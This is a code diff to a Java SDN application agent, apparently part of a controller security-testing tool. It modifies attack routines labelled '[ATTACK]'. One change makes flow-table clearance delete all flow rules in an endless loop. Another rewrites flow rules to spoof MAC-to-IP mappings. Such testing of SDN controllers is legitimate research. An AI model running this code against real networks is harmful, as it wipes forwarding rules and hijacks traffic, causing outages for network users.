@@ -554,8 +554,10 @@ public class AppAgent {
         return result;
     }
 
-    public void testFlowTableClearance(boolean isLoop) {
+    public String testFlowTableClearance(boolean isLoop) {
         System.out.println("[ATTACK] Flow_Table_Clearance");
+
+        String flows = "nothing";
 
         int cnt = 1;
         int loop = 0;
@@ -575,25 +577,24 @@ public class AppAgent {
                     FlowEntry e = (FlowEntry) f.next();
                     TrafficSelector select = e.selector();
                     Criterion c = select.getCriterion(Criterion.Type.ETH_TYPE);
-                    // System.out.println("Ether TYPE " +c.toString());
-                    if (c.toString().contains("800")) {
-                        flowRuleService.removeFlowRules(e);
-                        System.out.println("[ATTACK] Remove Rule: "
-                                + e.toString() + "\n");
-                    }
 
+                    flowRuleService.removeFlowRules(e);
+
+                    try {
+                        Thread.sleep(500);
+                    } catch (InterruptedException e1) {
+                        e1.printStackTrace();
+                    }
                 }
             }
 
             if (isLoop) {
                 i = -1;
-
-                if (loop++ == 1000) {
-                    System.out.println("Looop " + loop);
-                    break;
-                }
+                loop++;
             }
         }
+
+        return flows;
     }
 
     public boolean testEventListenerUnsubscription() {
@@ -718,7 +719,7 @@ public class AppAgent {
     }
 
     public String testSwitchFirmwareMisuse() {
-        String result = "";
+        String result = "flows";
 
         System.out.println("\n\n[ATTACK] Switch_Firmware_Misuse");
         TrafficSelector.Builder selector = DefaultTrafficSelector.builder();
@@ -778,12 +779,10 @@ public class AppAgent {
                                     old.priority(), this.appId, old.timeout(),
                                     false, null);
 
-                            if (!result.equals("")) {
-                                result = "Mac Address " + src.toString()
-                                        + "\n--> IP Address " + srcIP.toString();
+                            result = "Mac Address " + src.toString()
+                                    + "\n--> IP Address " + srcIP.toString();
 
-                                System.out.println("\n[ATTACK] " + result + "\n");
-                            }
+                            System.out.println("\n[ATTACK] " + result + "\n");
 
                             flowRuleService.removeFlowRules(old);
                             flowRuleService.applyFlowRules(newf);
